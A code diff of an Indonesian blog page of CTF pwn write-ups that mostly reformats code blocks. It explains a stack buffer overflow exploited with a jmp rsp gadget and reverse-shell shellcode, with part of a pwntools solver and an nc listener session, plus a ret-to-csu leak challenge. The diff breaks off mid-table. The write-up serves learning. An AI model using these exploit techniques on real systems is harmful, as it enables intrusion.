@@ -61,80 +61,13 @@
 
 
 		<p>Tulisan ini akan menjadi sebuah <em>remainder</em> perjalanan saya yang <em>mungkin</em> sudah setengah tahun lebih saya mulai masuk ke-dunia CTF, hingga <em>alhamdullillah</em> menjadi juara dari beberapa ajang kompetisi CTF ditingkat pelajar. <em>Yaa,</em> masih ditingkat pelajar. Mengingat tahun depan sudah harus masuk universitas, dan mungkin saja akan terbiasa dengan <em>nugad</em>, <em>nugad</em>, dan <em>nugad</em> (sesuai rumor ditelinga saya).</p>
-<p>Singkat cerita, saya menemukan CTF ini dari channel youtube <a href="https://youtube.com/c/JohnHammond010">John Hammond</a>, yang secara tidak sengaja muncul diberanda saya. <em>Plus,</em> saya lihat diposisi pertama ada tim <code>AmpunBangJago</code> yang notabene merupakan suatu bahasa yang <em>hype</em> di Indonesia. yang mungkin saja orang Indonesia.</p>
+<p>Singkat cerita, saya menemukan CTF ini dari channel youtube <a href="https://youtube.com/c/JohnHammond010">John Hammond</a>, yang secara tidak sengaja muncul diberanda saya. <em>Plus,</em> saya lihat diposisi pertama ada tim <a href="https://twitter.com/AmpunBang1337"><code>AmpunBangJago</code></a> yang notabene merupakan suatu bahasa yang <em>hype</em> di Indonesia. yang mungkin saja orang Indonesia.</p>
 <p><em>*source challanges dan solver ada dibawah.</em></p>
 <h1 id="stacked-489-pts">Stacked [489 pts]</h1>
 <p>Soal ini merupakan soal buffer-overflow, <em>dan</em> stack dalam kondisi <em>executable</em>. Mungkin saja inject shellcode diperlukan disini.</p>
 <h2 id="overview">Overview</h2>
 <p>main func.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
 {
     <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// rax@17
 </span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> optval; <span style="color:#75715e">// [sp+1Ch] [bp-44h]@7
@@ -197,51 +130,24 @@
     close(v11);
     exit(<span style="color:#ae81ff">0</span>);
 }
-</code></pre></td></tr></table>
-</div>
-</div><p>Fungsi main hanya melalukan listening ke localhost dengan port merupakan argument kedua. Lalu, untuk interaksi diproses pada fungsi handle_client.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssize_t <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">handle_client</span>(<span style="color:#66d9ef">int</span> a1)
+</code></pre></div><p>Fungsi main hanya melalukan listening ke localhost dengan port merupakan argument kedua. Lalu, untuk interaksi diproses pada fungsi handle_client.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssize_t <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">handle_client</span>(<span style="color:#66d9ef">int</span> a1)
 {
-    <span style="color:#66d9ef">char</span> buf; <span style="color:#75715e">// [sp+10h] [bp-400h]@1
-</span><span style="color:#75715e"></span>
+<span style="display:block;width:100%;background-color:#3c3d38">    <span style="color:#66d9ef">char</span> buf; <span style="color:#75715e">// [sp+10h] [bp-400h]@1
+</span></span><span style="color:#75715e"></span>
     send(a1, <span style="color:#e6db74">&#34;Overflow me!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0xDuLL</span>, <span style="color:#ae81ff">0</span>);
     send(a1, <span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#ae81ff">2uLL</span>, <span style="color:#ae81ff">0</span>);
-    <span style="color:#66d9ef">return</span> recv(a1, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0x800uLL</span>, <span style="color:#ae81ff">0</span>);
-}
-</code></pre></td></tr></table>
-</div>
-</div><p>Bug-nya terlihat jelas pada <em>handle_client</em> dimana user diberikan input sebesar 0x800 yang ditampung di variable buf, tetapi variable buf hanya berukuran 0x400.</p>
+<span style="display:block;width:100%;background-color:#3c3d38">    <span style="color:#66d9ef">return</span> recv(a1, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0x800uLL</span>, <span style="color:#ae81ff">0</span>);
+</span>}
+</code></pre></div><p>Bug-nya terlihat jelas pada <em>handle_client</em> dimana user diberikan input sebesar 0x800 yang ditampung di variable buf, tetapi variable buf hanya berukuran 0x400.</p>
 <h2 id="exploit">Exploit</h2>
 <p>Terdapat fungsi yang menarik disini, yaitu pada fungsi <em>useful</em>.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">Dump of assembler code <span style="color:#66d9ef">for</span> function useful:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">Dump of assembler code <span style="color:#66d9ef">for</span> function useful:
    <span style="color:#ae81ff">0x0000000000401557</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	jmp    rsp
    <span style="color:#ae81ff">0x0000000000401559</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span>:	nop
    <span style="color:#ae81ff">0x000000000040155a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">&gt;</span>:	ud2    
 End of assembler dump<span style="color:#f92672">.</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>kondisi stack executable, jadi bisa jump ke shellcode kita dengan gadget diatas.</p>
+</code></pre></div><p>kondisi stack executable, jadi bisa jump ke shellcode kita dengan gadget diatas.</p>
 <p>Karena interaksi berjalan di <em>child</em> dan diprocess di <em>parent</em>, inject shellcode secara langsung disini stdin, stdout akan masuk secara interaktif di <em>parent</em>. Sementara kita berada diposisi yang berinteraksi dengan <em>parent</em>.</p>
 <pre><code>λ &gt; ./stacked 1111
 Listening on port 1111...
@@ -252,44 +158,7 @@ $ uname -a
 Linux zeroday 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 </code></pre><p>Solusinya adalah menggunakan <em>socketcall</em> syscall <a href="https://medium.com/@chaudharyaditya/slae-0x2-linux-x86-reverse-shellcode-d7126d638aff">[1]</a><a href="https://barriersec.com/2018/11/linux-x86-reverse-shell-shellcode/">[2]</a>, yaitu dengan menduplikasi stdin, stdout, dan stderr ke socket.</p>
 <p>Full solver dengan bantuan shellcraft dari pwntools.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
@@ -322,9 +191,7 @@ gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;
     <span style="color:#66d9ef">else</span>:
         r <span style="color:#f92672">=</span> process(ELF_PATH, aslr<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
     exploit(r)
-</code></pre></td></tr></table>
-</div>
-</div><p>profit.</p>
+</code></pre></div><p>profit.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ nc -vlp <span style="color:#ae81ff">4444</span>
 Listening on <span style="color:#f92672">[</span>0.0.0.0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>family 0, port 4444<span style="color:#f92672">)</span>
 Connection from localhost <span style="color:#ae81ff">57362</span> received!
@@ -343,29 +210,15 @@ flag<span style="color:#f92672">{</span>e4fd4c9fcad9ba84666e5c7a4a9ab1f0<span st
 <p>Libc diberikan, berarti perlu <em>leak-meleak</em> disini. dan <em>mungkin</em> saja ret-to-libc (?)</p>
 <h2 id="main-function">Main Function</h2>
 <p>Sangat singkat, write dan read. Dengan buffer-overflow di read.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
 {
-    <span style="color:#66d9ef">char</span> buf; <span style="color:#75715e">// [sp+0h] [bp-200h]@1
-</span><span style="color:#75715e"></span>
+<span style="display:block;width:100%;background-color:#3c3d38">    <span style="color:#66d9ef">char</span> buf; <span style="color:#75715e">// [sp+0h] [bp-200h]@1
+</span></span><span style="color:#75715e"></span>
     write(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>unk_402004, <span style="color:#ae81ff">2uLL</span>);
-    read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0x400uLL</span>);
-    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+<span style="display:block;width:100%;background-color:#3c3d38">    read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0x400uLL</span>);
+</span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 }
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="information-leak">Information Leak</h2>
+</code></pre></div><h2 id="information-leak">Information Leak</h2>
 <p>Ini merupakan binary x86_64 atau 64-bit. Parameter-parameter fungsi secara berurutan terletak pada register <em>rdi, rsi, rdx, rcx, r8, r9,</em> selebihnya di-<em>stack</em>.</p>
 <p>Sementara, gadget untuk set rdi, rsi, rdx dalam binary ini tidak ditemukan. Dan untuk melakukan leak dengan fungsi <em>write</em>, diperlukan 3 parameter (rdi, rsi, rdx).</p>
 <blockquote>
@@ -373,66 +226,7 @@ flag<span style="color:#f92672">{</span>e4fd4c9fcad9ba84666e5c7a4a9ab1f0<span st
 </blockquote>
 <p>Ada suatu teknik yang bernama <code>ret-to-csu</code><a href="https://bananamafia.dev/post/x64-rop-redpwn/">[1]</a> yang dipresentasikan di Black Hat Asia 2018. Teknik ini didasari dari gadget yang ada didalam fungsi <code>__libc_csu_init</code>. Saya tidak akan membahas ret-to-csu disini. Karena teknik ini tidak terlalu rumit juga, <em>plus</em> sudah banyak yang tau juga.</p>
 <p>Full solver,</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
